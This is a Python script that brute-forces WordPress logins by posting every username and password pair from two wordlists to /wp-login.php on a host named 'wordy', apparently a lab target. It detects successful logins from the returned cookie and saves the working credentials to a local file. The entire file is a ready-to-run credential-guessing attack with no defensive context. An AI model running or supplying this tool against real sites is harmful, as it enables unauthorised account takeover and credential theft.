import sys
import requests


print(("xxx.py url userlist passwdlist"))
host = "http://wordy/"#sys.argv[1]
ulist = open(sys.argv[2]).readlines()
plist = open(sys.argv[3]).readlines()

url = host + "/wp-login.php"

def fileputcontent(file,msg,Append="w"):
    with open(file,Append) as f:
        f.write(msg)
        f.close()



def POST(url, head={}, data={},session = requests.session(), **opt):
    cookie = opt.get("cookie", "")
    ua = opt.get("ua",
                 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36")
    gap = opt.get("gap", 0)
    timeout = opt.get("timeout", 5)
    retry = opt.get("retry", 0)
    import time
    import requests
    resp = None
    if head.get("Cookie", True):
        head["Cookie"] = cookie
    if head.get("User-Agent", True):
        head["User-Agent"] = ua
    if retry != 0:
        if type(retry) in [type([]), type({}), type((1, 2, 3))]:
            while True:
                resp = session.post(url=url, headers=head, timeout=timeout, data=data,allow_redirects=opt.get("red",True))
                stacode = resp.status_code
                time.sleep(gap)
                if stacode in retry:
                    continue
                else:
                    break
        if type(retry) in [type(""), type(123)]:
            while True:
                resp = session.post(url=url, headers=head, timeout=timeout, data=data,allow_redirects=opt.get("red",True))
                stacode = resp.status_code
                time.sleep(gap)
                if stacode != int(retry):
                    continue
                else:
                    break
    else:
        resp = session.post(url=url, headers=head, timeout=timeout, data=data,allow_redirects=opt.get("red",True))

    return resp


def login(session,url, x, y):
    # =a&=a&=&=&=1
    resp = POST(session=session,url=url, data={
        "log": x.strip(),
        "pwd": y.strip(),
        "wp-submit": "Log+In",
        "redirect_to": "http%3A%2F%2Fwordy%2Fwp-admin%2F",
        "testcookie": 1
    },red=False)
    resp.encoding = "utf-8"
    cookie = (resp.headers.get("Set-Cookie","----"))
    if len(cookie) > len("wordpress_test_cookie=WP+Cookie+check; path=/,"):
        print("[+]:{}|{}".format(x.strip(),y.strip()))
        fileputcontent("./res.txt","{}|{}\n".format(x.strip(),y.strip()))


i = 0
session = requests.session()
for x in ulist:
    for y in plist:
        print("\r[{}|{}/{}]".format(x.strip(),str(i), str(len(plist))),end="")
        login(session,url, x=x, y=y)
        i += 1
    i = 0


